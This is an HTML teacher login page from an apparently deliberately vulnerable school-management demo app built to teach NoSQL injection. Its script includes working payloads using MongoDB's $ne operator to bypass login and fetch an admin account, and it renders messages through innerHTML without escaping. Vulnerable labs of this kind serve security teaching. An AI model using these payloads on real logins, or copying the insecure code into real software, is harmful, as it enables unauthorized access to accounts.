<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Teacher Login - School Management</title>
  <link rel="stylesheet" href="/css/style.css">
</head>
<body>
  <div class="login-container">
    <div class="card login-card">
      <div class="logo-section">
        <h1>Teacher Portal</h1>
        <p>School Management System</p>
      </div>

      <div class="vuln-warning">
        <h4>Warning: NoSQL Injection Demo</h4>
        <p>This login is vulnerable to NoSQL Injection attacks</p>
      </div>

      <div id="alert-container"></div>

      <form id="login-form">
        <div class="form-group">
          <label for="email">Email</label>
          <input type="text" id="email" name="email" placeholder="Enter your email" required>
        </div>

        <div class="form-group">
          <label for="password">Password</label>
          <input type="password" id="password" name="password" placeholder="Enter your password" required>
        </div>

        <button type="submit" class="btn btn-primary" style="width: 100%;">Login as Teacher</button>
      </form>

      <div style="margin-top: 20px; padding-top: 20px; border-top: 1px solid #eee;">
        <p style="color: #888; font-size: 14px; margin-bottom: 10px;">Exploit Examples:</p>
        <button class="btn btn-danger" onclick="injectNoSQL()" style="width: 100%; margin-bottom: 10px;">
          Inject: {"$ne": ""} - Bypass Login
        </button>
        <button class="btn btn-danger" onclick="injectAdmin()" style="width: 100%; margin-bottom: 10px;">
          Inject: Get Admin Account
        </button>
        <a href="/index.html" class="btn btn-success" style="width: 100%; display: block; text-align: center; text-decoration: none;">
          Student Login
        </a>
      </div>
    </div>
  </div>

  <script src="/js/app.js"></script>
  <script>
    document.getElementById('login-form').addEventListener('submit', async (e) => {
      e.preventDefault();
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;

      try {
        const res = await fetch('/api/teachers/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email, password })
        });

        const data = await res.json();
        if (res.ok) {
          showAlert(`Login successful! Welcome ${data.teacher.name} (${data.role})`, 'success');
          localStorage.setItem('teacher', JSON.stringify(data.teacher));
          localStorage.setItem('permissions', JSON.stringify(data.permissions));
          localStorage.setItem('role', data.role);
          setTimeout(() => window.location.href = '/teacher-dashboard.html', 1000);
        } else {
          showAlert(data.message, 'danger');
        }
      } catch (err) {
        showAlert('Connection error', 'danger');
      }
    });

    function injectNoSQL() {
      fetch('/api/teachers/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: { "$ne": "" }, password: { "$ne": "" } })
      })
      .then(res => res.json())
      .then(data => {
        if (data.teacher) {
          showAlert(`NoSQL Injection successful! Bypassed as: ${data.teacher.name} (Role: ${data.role})`, 'success');
          localStorage.setItem('teacher', JSON.stringify(data.teacher));
          localStorage.setItem('permissions', JSON.stringify(data.permissions));
          localStorage.setItem('role', data.role);
        } else {
          showAlert('No teachers in database to exploit', 'warning');
        }
      })
      .catch(err => showAlert('Error: ' + err.message, 'danger'));
    }

    function injectAdmin() {
      fetch('/api/teachers/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          email: { "$ne": "" }, 
          password: { "$ne": "" },
          role: "admin"
        })
      })
      .then(res => res.json())
      .then(data => {
        if (data.teacher) {
          showAlert(`Got account: ${data.teacher.name} (Role: ${data.role}, Permissions: ${data.permissions.join(', ')})`, 'success');
          localStorage.setItem('teacher', JSON.stringify(data.teacher));
          localStorage.setItem('permissions', JSON.stringify(data.permissions));
          localStorage.setItem('role', data.role);
        } else {
          showAlert('No admin teachers found', 'warning');
        }
      })
      .catch(err => showAlert('Error: ' + err.message, 'danger'));
    }

    function showAlert(message, type) {
      document.getElementById('alert-container').innerHTML = 
        `<div class="alert alert-${type}">${message}</div>`;
    }
  </script>
</body>
</html>
